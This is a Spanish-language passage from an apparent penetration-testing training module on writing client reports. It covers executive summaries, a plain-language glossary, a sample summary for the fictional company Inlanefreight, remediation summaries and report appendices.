* `Describe los tipos de cosas a las que lograste acceder.` Es posible que su audiencia no tenga idea de lo que significa "Administrador de dominio", pero si menciona que obtuvo acceso a una cuenta que le permitió acceder a documentos de RR.HH., sistemas bancarios y otros activos críticos, eso es universalmente comprensible.
* `Describe los aspectos generales que necesitas mejorar para mitigar los riesgos que descubriste`. Esto no debería ser "instalar 3 parches y llamarme dentro de un año". Deberías pensar en "¿qué proceso falló que permitió que una vulnerabilidad de hace cinco años quedara sin parchear en una cuarta parte del entorno?". Si realizar un Password Spraying y obtienes 500 accesos a `Welcome1!`, cambiar las contraseñas de esas 500 cuentas es solo una parte de la solución. La otra parte probablemente sea proporcionar al Help Desk una forma de establecer contraseñas iniciales más seguras de forma eficiente.
* `Si te sientes valiente y tienes una cantidad decente de experiencia en ambos lados, proporciona una expectativa general de cuánto esfuerzo será necesario para solucionar algunos de estos problemas`. Si tiene una larga trayectoria como administrador de sistemas o ingeniero y sabe cuánta política interna deben atravesar las personas para comenzar a manipular las políticas de grupo, es posible que desee intentar establecer una expectativa de niveles bajos, moderados y significativos de tiempo y esfuerzo para corregir los problemas, de modo que un CEO demasiado entusiasta no vaya a decirle a su equipo de servidores que necesitan aplicar plantillas de refuerzo de CIS a sus GPO durante el fin de semana sin probarlas primero.

**Que NO Hacer**

* `Nombrar o recomendar proveedores específicos`. El entregable es un documento técnico, no de ventas. Es aceptable sugerir tecnologías como EDR o agregación de registros, pero evite recomendar proveedores específicos de esas tecnologías, como CrowdStrike y Splunk. Si tiene experiencia reciente con un proveedor en particular y se siente cómodo brindándole esa retroalimentación al cliente, hágalo fuera de banda y asegúrese de dejar claro que debe tomar su propia decisión (y probablemente incluya al ejecutivo de cuenta del cliente en esa conversación). Si describe vulnerabilidades específicas, es más probable que el lector reconozca algo como "proveedores como VMWare, Apache y Adobe" en lugar de "vSphere, Tomcat y Acrobat".
* `Usa Acrónimos.`IP y VPN han alcanzado un nivel de ubicuidad que quizás esté bien, pero usar siglas para protocolos y tipos de ataques (por ejemplo, SNMP, MitM) es insensible y hará que su resumen ejecutivo sea completamente ineficaz para la audiencia a la que está dirigido.
* `Dedica más tiempo a hablar de cosas que no importan que a hablar de los hallazgos significativos del informe`. Está en tu poder desviar la atención. No la desperdicies en los problemas que descubriste que no fueron tan impactantes.
* `Utilice palabras que nadie haya oído nunca antes`. Tener un vocabulario amplio es genial, pero si nadie entiende lo que intentas decir o tienen que buscar el significado de las palabras, solo son una distracción. Muéstralo en otro lugar.
* `Haga referencia a una sección más técnica del informe`. El ejecutivo podría leer esto porque no comprende los detalles técnicos o simplemente no tiene tiempo. Además, a nadie le gusta tener que desplazarse por el informe para entender qué sucede.

#### **Cambios de vocabulario**

Para ofrecer algunos ejemplos de lo que significa "escribir para un público no técnico", a continuación, presentamos algunos ejemplos de términos técnicos y acrónimos que podrías usar, junto con una alternativa menos técnica. Esta lista no es exhaustiva ni la forma correcta de describir estos conceptos. Se ofrecen ejemplos de cómo describir un tema técnico de una manera más comprensible para todos.

* `VPN, SSH`- Un protocolo utilizado para la administración remota segura
* `SSL/TLS`- Tecnología utilizada para facilitar la navegación web segura
* `Hash`- El resultado de un algoritmo comúnmente utilizado para validar la integridad de los archivos. También se le denomina hash a una contraseña encriptada.
* `Password Spraying`- Ataque en el que se intenta obtener una única contraseña fácil de adivinar para una lista grande de cuentas de usuarios recopiladas
* `Password Cracking`- Ataque de contraseña sin conexión en el que la forma criptográfica (hash) de la contraseña de un usuario se convierte a su forma legible para humanos
* `Buffer overflow/deserialization/etc.`- Ataque que resultó en la ejecución remota de un comando en el host objetivo
* `OSINT`- Recopilación de inteligencia de fuentes abiertas, o búsqueda/uso de datos sobre una empresa y sus empleados que se pueden encontrar mediante motores de búsqueda y otras fuentes públicas sin interactuar con la red de una empresa.
* `SQL injection/XSS`- Vulnerabilidad en la que se acepta la entrada del usuario sin sanitizar los caracteres destinados a manipular la lógica de la aplicación de manera no intencionada

Estos son solo algunos ejemplos. Su glosario crecerá con el tiempo a medida que escriba más informes. También puede mejorarlo en esta área leyendo los resúmenes ejecutivos que otros han escrito, describiendo algunos de los mismos hallazgos que usted suele descubrir. Hacerlo puede ser el catalizador para pensar algo de una manera diferente. También puede recibir comentarios del cliente de vez en cuando sobre esto, y es importante recibirlos con elegancia y una mente abierta. Puede tener la tentación de ponerse a la defensiva (especialmente si el cliente es muy agresivo), pero al final del día, le pagaron para crearles un producto útil. Si no es porque no lo pueden entender, entonces considérelo una oportunidad para practicar y crecer. Tomar los comentarios del cliente como un ataque personal puede ser difícil de no hacer, pero es una de las cosas más valiosas que pueden ofrecerle.

***

### Ejemplo de resumen ejecutivo

A continuación se muestra un resumen ejecutivo de muestra que se tomó del informe de muestra incluido en esta sección:

Durante la prueba de penetración interna contra Inlanefreight, el pentester identificó siete (7) hallazgos que amenazan la confidencialidad, integridad y disponibilidad de los sistemas de información de Inlanefreight. Los hallazgos se clasificaron por nivel de gravedad: cinco (5) recibieron una calificación de riesgo alto, uno (1) de riesgo medio y uno (1) de riesgo bajo. También se detectó un (1) hallazgo informativo relacionado con la mejora de las capacidades de monitoreo de seguridad en la red interna.

El pentester constató que la gestión de parches y vulnerabilidades de Inlanefreight se mantenía correctamente. Ninguno de los hallazgos de este informe se relacionó con la falta de parches del sistema operativo o de terceros para vulnerabilidades conocidas en servicios y aplicaciones que pudieran provocar accesos no autorizados y comprometer el sistema. Cada falla descubierta durante las pruebas se relacionó con una configuración incorrecta o falta de refuerzo, y la mayoría se clasificó como autenticación y autorización débiles.

Un hallazgo se relacionó con un protocolo de comunicación de red que puede falsificarse para recuperar contraseñas de usuarios internos, lo que puede utilizarse para obtener acceso no autorizado si un atacante logra acceder a la red sin credenciales. En la mayoría de los entornos corporativos, este protocolo es innecesario y puede desactivarse. Está habilitado por defecto principalmente para pequeñas y medianas empresas que no disponen de los recursos para un servidor dedicado de resolución de nombres de host (la "guía telefónica" de su red). Durante la evaluación, se observaron estos recursos en la red, por lo que Inlanefreight debería comenzar a formular un plan de pruebas para desactivar este servicio peligroso.

El siguiente problema fue una configuración débil relacionada con las cuentas de servicio, que permite a cualquier usuario autenticado robar un componente del proceso de autenticación, a menudo descifrable sin conexión (mediante el descifrado de contraseñas), para revelar la contraseña legible por humanos. Este tipo de cuentas de servicio suelen tener más privilegios que un usuario estándar, por lo que obtener una de sus contraseñas en texto plano podría resultar en un movimiento lateral o una escalada de privilegios, y eventualmente en la vulneración total de la red interna. El pentester también observó que se usaba la misma contraseña para el acceso de administrador a todos los servidores de la red interna. Esto significa que, si un servidor se ve comprometido, un atacante puede reutilizar esta contraseña para acceder a cualquier servidor que la comparta con acceso administrativo. Afortunadamente, ambos problemas se pueden corregir sin necesidad de herramientas de terceros. Active Directory de Microsoft contiene configuraciones que se pueden usar para minimizar el riesgo de que estos recursos se abusen en beneficio de usuarios maliciosos.

También se descubrió que un servidor web ejecutaba una aplicación web que utilizaba credenciales débiles y fáciles de adivinar para acceder a una consola administrativa, lo cual podría utilizarse para obtener acceso no autorizado al servidor subyacente. Un atacante podría aprovechar esto en la red interna sin necesidad de una cuenta de usuario válida. Este ataque está muy bien documentado, por lo que es un objetivo muy probable que puede ser particularmente dañino, incluso en manos de un atacante inexperto. Idealmente, se debería deshabilitar el acceso externo directo a este servicio; sin embargo, en caso de que no sea posible, debería reconfigurarse con credenciales excepcionalmente seguras que se roten con frecuencia. Inlanefreight también podría considerar maximizar los datos de registro recopilados de este dispositivo para garantizar que los ataques contra él se puedan detectar y clasificar rápidamente.

El pentester también detectó carpetas compartidas con permisos excesivos, lo que significa que todos los usuarios de la red interna pueden acceder a una cantidad considerable de datos. Si bien compartir archivos internamente entre departamentos y usuarios es importante para las operaciones diarias de la empresa, los permisos demasiado amplios en los recursos compartidos de archivos pueden provocar la divulgación involuntaria de información confidencial. Incluso si un recurso compartido de archivos no contiene información confidencial actualmente, alguien podría colocar dichos datos allí sin darse cuenta, pensando que está protegido cuando no lo está. Esta configuración debe modificarse para garantizar que los usuarios solo puedan acceder a lo necesario para realizar sus tareas diarias.

Finalmente, el pentester observó que las actividades de prueba parecían pasar prácticamente desapercibidas, lo que podría representar una oportunidad para mejorar la visibilidad de la red interna e indicar que un atacante real podría pasar desapercibido si logra acceder a ella. Inlanefreight debería crear un plan de remediación basado en la sección Resumen de Remediación de este informe, abordando todos los hallazgos importantes lo antes posible, según las necesidades de la empresa. Inlanefreight también debería considerar realizar evaluaciones periódicas de vulnerabilidades si aún no las realiza. Una vez abordados los problemas identificados en este informe, una evaluación de seguridad de Active Directory más colaborativa y exhaustiva puede ayudar a identificar oportunidades adicionales para fortalecer el entorno de Active Directory, dificultando que los atacantes se desplacen por la red y aumentando la probabilidad de que Inlanefreight pueda detectar y responder a actividades sospechosas.

### **Anatomía del resumen ejecutivo**

Ese texto es genial, pero ¿cómo llegamos hasta ahí? Analicemos el proceso de razonamiento, ¿de acuerdo? Para este análisis, usaremos el informe de ejemplo que puedes descargar en el siguiente enlace:

{% embed url="<https://drive.proton.me/urls/NN9YFX6V40#AXwr1BuZXROI>" %}

Lo primero que probablemente querremos hacer es recopilar una lista de los hallazgos e intentar categorizar la naturaleza del riesgo de cada uno. Estas categorías serán la base de lo que se discutirá en el resumen ejecutivo. En nuestro informe de muestra, tenemos los siguientes hallazgos:

* Suplantación de respuesta LLMNR/NBT-NS -`configuration change/system hardening`
* Autenticación Kerberos débil (“Kerberoasting”) - `configuration change/system hardening`
* Reutilización de la contraseña del administrador local - `behavioral/system hardening`
* Contraseñas débiles de Active Directory - `behavioral`
* Credenciales débiles/predeterminadas del administrador de Tomcat altas - `configuration change/system hardening`
* Recursos compartidos de archivos inseguros - `configuration change/system hardening/permissions`
* Listado de directorios habilitado - `configuration change/system hardening`
* Mejorar las capacidades de monitoreo de seguridad - `configuration change/system hardening`

En primer lugar, cabe destacar que en esta lista no hay problemas relacionados con parches faltantes, lo que indica que el cliente podría haber dedicado un tiempo y esfuerzo considerables a perfeccionar ese proceso. Cualquiera que haya sido administrador de sistemas sabrá que esto no es poca cosa, por lo que queremos reconocer su esfuerzo. Esto le hace ganarse el cariño del equipo de administradores de sistemas, ya que demuestra a sus ejecutivos que el trabajo que han realizado ha sido eficaz y los anima a seguir invirtiendo en personal y tecnología que puedan ayudar a corregir algunos de sus problemas.

Volviendo a nuestros hallazgos, casi todos implican algún tipo de cambio de configuración o una solución para el fortalecimiento del sistema. Para simplificarlo aún más, se podría concluir que este cliente en particular tiene un proceso de gestión de la configuración inmaduro (es decir, no realizan un buen trabajo al cambiar las configuraciones predeterminadas de ningún elemento antes de ponerlo en producción). Dado que ocho hallazgos implican mucho análisis, probablemente no sea conveniente escribir un párrafo que diga simplemente "configurar mejor las cosas". Dispone de espacio para abordar algunos problemas individuales y describir parte del impacto (lo más relevante) de algunos de los hallazgos más perjudiciales. Desarrollar un proceso de gestión de la configuración requerirá mucho trabajo, por lo que es importante describir qué sucedió o podría suceder si este problema no se soluciona.

Al leer cada párrafo, probablemente podrá relacionar la descripción general con el hallazgo asociado para tener una idea de cómo describir algunos de los términos más técnicos de forma que un público sin conocimientos técnicos pueda seguirlos sin tener que buscar información. Notará que no usamos acrónimos, no hablamos de protocolos, ni mencionamos tickets que otorgan otros tickets, ni nada por el estilo. En algunos casos, también describimos anécdotas generales sobre el nivel de esfuerzo esperado para la remediación, los cambios que deben realizarse con precaución, las soluciones alternativas para monitorear una amenaza determinada y el nivel de habilidad necesario para realizar la explotación. NO es necesario tener un párrafo para cada hallazgo. Si tiene un informe con 20 hallazgos, se descontrolaría rápidamente. Intente centrarse en los más impactantes.

También conviene mencionar un par de matices:

* Ciertas observaciones que realice durante la evaluación pueden indicar un problema más significativo que el cliente podría desconocer. Obviamente, es valioso proporcionar este análisis, pero debe tener cuidado al redactarlo para asegurarse de no estar hablando en términos absolutos debido a una suposición.
* Al final, verá un párrafo que indica **que el** cliente no detectó nuestra actividad de prueba. Estos calificadores son importantes porque no está completamente seguro de que no lo haya hecho. Es posible que simplemente no le hayan informado.
* Otro ejemplo de esto (en general, no incluido en este resumen ejecutivo) sería escribir algo como "comenzar a documentar las plantillas y procesos de fortalecimiento del sistema". Esto insinúa que no han hecho nada, lo cual podría resultar ofensivo si realmente lo intentaran y fracasaran. En su lugar, podría decir: "Revisar los procesos de gestión de la configuración y abordar las deficiencias que provocaron los problemas identificados en este informe".

Espero que esto ayude a aclarar algunos de los procesos de pensamiento que se utilizaron al escribir esto y les dé algunas ideas sobre cómo pensar en las cosas de manera diferente al intentar describirlas. Las palabras tienen significado, así que asegúrense de elegirlas con cuidado.

***

## <mark style="color:purple;">Resumen de recomendaciones</mark>

Antes de analizar los hallazgos técnicos, conviene incluir una sección `Remediation Summary`. Aquí podemos enumerar nuestras recomendaciones a corto, mediano y largo plazo, basándonos en nuestros hallazgos y en el estado actual del entorno del cliente. Necesitaremos aplicar nuestra experiencia y conocimiento del negocio del cliente, su presupuesto de seguridad, sus necesidades de personal, etc., para elaborar recomendaciones precisas. Nuestros clientes suelen aportar información sobre esta sección, por lo que queremos que sea correcta; de lo contrario, las recomendaciones serán inútiles. Si la estructuramos correctamente, nuestros clientes pueden usarla como base para una hoja de ruta de remediación. Si opta por no hacerlo, prepárese para que los clientes le pidan que priorice la remediación. Puede que no ocurra siempre, pero si tiene un informe con 15 hallazgos de alto riesgo y nada más, probablemente querrán saber cuál de ellos es el más importante. Como dice el dicho, "cuando todo es importante, nada es importante".

Debemos vincular cada recomendación a un hallazgo específico y no incluir ninguna recomendación a corto o mediano plazo que no sea viable mediante la corrección de los hallazgos reportados más adelante en el informe. Las recomendaciones a largo plazo pueden corresponder a recomendaciones informativas o de mejores prácticas, como... `"Crear plantillas de seguridad de referencia para hosts de Windows Server y Workstation."`pero también pueden ser recomendaciones generales, como...`"Realizar ejercicios periódicos de ingeniería social con informes de seguimiento y capacitación sobre concientización sobre seguridad para construir una cultura centrada en la seguridad dentro de la organización."`

Algunos hallazgos podrían tener una recomendación asociada a corto y largo plazo. Por ejemplo, si un parche específico falta en muchos lugares, es señal de que la organización tiene dificultades con la gestión de parches y quizás no cuenta con un programa sólido de gestión de parches, ni con las políticas y procedimientos correspondientes. La solución a corto plazo sería implementar los parches pertinentes, mientras que el objetivo a largo plazo sería revisar los procesos de gestión de parches y vulnerabilidades para abordar cualquier deficiencia que evite que el mismo problema vuelva a surgir. En el ámbito de la seguridad de aplicaciones, podría ser, en cambio, corregir el código a corto plazo y, a largo plazo, revisar el ciclo de vida del desarrollo de software (SDLC) para garantizar que la seguridad se considere con la suficiente antelación en el proceso de desarrollo para evitar que estos problemas lleguen a producción.

***

## <mark style="color:purple;">Hallazgos</mark>

Después del Resumen Ejecutivo, esta sección `Findings` es una de las más importantes. Nos brinda la oportunidad de presentar nuestro trabajo, presentar al cliente una visión del riesgo para su entorno, proporcionar a los equipos técnicos la evidencia para validar y reproducir los problemas, y brindar asesoramiento para su remediación. Analizaremos esta sección del informe en detalle en la siguiente sección de este módulo: [Cómo redactar un hallazgo](https://academy.hackthebox.com/module/162/section/1536) .

***

## <mark style="color:purple;">Apéndices</mark>

Hay apéndices que deberían aparecer en todos los informes, pero otros serán dinámicos y podrían no ser necesarios en todos. Si alguno de estos apéndices aumenta el tamaño del informe innecesariamente, considere si una hoja de cálculo complementaria sería una mejor manera de presentar los datos (sin mencionar la mayor capacidad de ordenación y filtrado).

***

### Apéndices estáticos

#### **Alcance**

Muestra el alcance de la evaluación (URL, rangos de red, instalaciones, etc.). La mayoría de los auditores a quienes el cliente debe entregar el informe necesitarán ver esto.

#### **Metodología**

Explique el proceso repetible que sigue para garantizar que sus evaluaciones sean exhaustivas y consistentes.

#### **Calificaciones de gravedad**

Si sus calificaciones de gravedad no se corresponden directamente con una puntuación CVSS o similar, deberá articular los criterios necesarios para cumplir con sus definiciones de gravedad. Tendrá que justificar esto ocasionalmente, así que asegúrese de que sea sólido y pueda respaldarse con lógica, y de que los hallazgos que incluya en su informe se califiquen en consecuencia.

#### **Biografías**

Si realiza evaluaciones con el objetivo específico de cumplir con PCI, el informe debe incluir una biografía del personal que la realizó, con el objetivo específico de demostrar que el consultor está debidamente cualificado para realizarla. Incluso sin obligaciones de cumplimiento, esto puede brindar al cliente la tranquilidad de que quien realizó la evaluación sabía lo que hacía.

***

### Apéndices dinámicos

#### **Intentos de explotación y payloads**

Si alguna vez has participado en la respuesta a incidentes, deberías saber cuántos artefactos quedan después de una prueba de penetración para que los forenses intenten analizarlos. Sé respetuoso y registra tus acciones para que, si experimentan un incidente, puedan diferenciar quiénes fueron tus atacantes de los que realmente lo fueron. Si generas payloads personalizados, sobre todo si las guardas en un disco, también deberías incluir aquí sus detalles para que el cliente sepa exactamente dónde ir y qué buscar para eliminarlas. Esto es especialmente importante para las cargas útiles que no puedes limpiar tú mismo.

#### **Credenciales comprometidas**

Si se vio comprometida una gran cantidad de cuentas, es útil enumerarlas aquí (si compromete todo el dominio, podría ser un esfuerzo en vano enumerar todas las cuentas de usuario en lugar de decir simplemente "todas las cuentas del dominio") para que el cliente pueda tomar medidas contra ellas si es necesario.

#### **Cambios de configuración**

Si realizó algún cambio de configuración en el entorno del cliente (ojalá lo haya solicitado primero), debe detallarlo todo para que el cliente pueda revertirlo y eliminar cualquier riesgo que haya introducido en el entorno (como deshabilitar EDR, etc.). Obviamente, lo ideal es que usted mismo restablezca las cosas como estaban y obtenga la aprobación por escrito del cliente para cambiarlas y así evitar ser regañado posteriormente si el cambio tiene consecuencias imprevistas para un proceso generador de ingresos.

#### **Ámbito de aplicación adicional**

Si tiene un hallazgo con una lista de hosts afectados que sería demasiado extensa para incluirla en el propio hallazgo, generalmente puede consultar un apéndice del hallazgo para ver una lista completa de los hosts afectados y crear una tabla para mostrarlos en varias columnas. Esto ayuda a mantener el informe limpio en lugar de tener una lista con viñetas de varias páginas.

#### **Recopilación de información**

Si la evaluación consiste en una prueba de penetración externa, podemos incluir datos adicionales para ayudar al cliente a comprender su impacto externo. Esto podría incluir datos Whois, información sobre la propiedad del dominio, subdominios, correos electrónicos detectados, cuentas encontradas en datos públicos de filtraciones ( [DeHashed](https://www.dehashed.com/) es ideal para esto), un análisis de las configuraciones SSL/TLS del cliente e incluso una lista de puertos/servicios accesibles externamente (en una prueba externa de gran alcance, probablemente convenga crear una hoja de cálculo adicional). Estos datos pueden ser útiles en un informe con pocos o ningún hallazgo, pero deben aportar algún valor al cliente y no ser simplemente información superflua.

#### **Análisis de contraseñas de dominio**

Si puede obtener acceso de administrador de dominio y volcar la base de datos NTDS, le recomendamos ejecutar Hashcat con varias listas de palabras y reglas, e incluso forzar la NTLM hasta ocho caracteres si su herramienta de descifrado de contraseñas es lo suficientemente potente. Una vez agotados los intentos de descifrado, puede usar una herramienta como [DPAT](https://github.com/clr2of8/DPAT) para generar un informe con diversas estadísticas. Puede incluir solo algunas estadísticas clave de este informe (por ejemplo, número de hashes obtenidos, número y porcentaje de descifrados, número de descifrados de cuentas privilegiadas (por ejemplo, administradores de dominio y administradores de empresa), las X contraseñas principales y el número de contraseñas descifradas por cada longitud de carácter). Esto puede ayudar a aclarar los temas de las secciones Resumen ejecutivo y Hallazgos sobre contraseñas débiles. También puede proporcionar al cliente el informe DPAT completo como información complementaria.

***

## <mark style="color:purple;">Diferencias en los tipos de informes</mark>

En este módulo, cubriremos principalmente todos los elementos que deben incluirse en un informe de Prueba de Penetración Interna o una Prueba de Penetración Externa que haya resultado en un compromiso interno. Algunos elementos del informe (como la Cadena de Ataque) probablemente no sean aplicables en un informe de Prueba de Penetración Externa sin compromiso interno. Este tipo de informe se centraría más en la recopilación de información, los datos OSINT y los servicios expuestos externamente. Probablemente no incluiría apéndices como credenciales comprometidas, cambios de configuración o análisis de contraseñas de dominio. Un informe de Evaluación de Seguridad de Aplicaciones Web (WASA) probablemente se centraría principalmente en las secciones de Resumen Ejecutivo y Hallazgos, y probablemente haría hincapié en el Top 10 de OWASP. Una evaluación de seguridad física, una evaluación de Red Team o una intervención de ingeniería social se redactarían en un formato más narrativo. Se recomienda crear plantillas para diversos tipos de evaluaciones, de modo que las tenga listas cuando surja ese tipo de evaluación en particular.

Ahora que hemos cubierto los elementos de un informe, profundicemos en cómo redactar un hallazgo de manera efectiva.
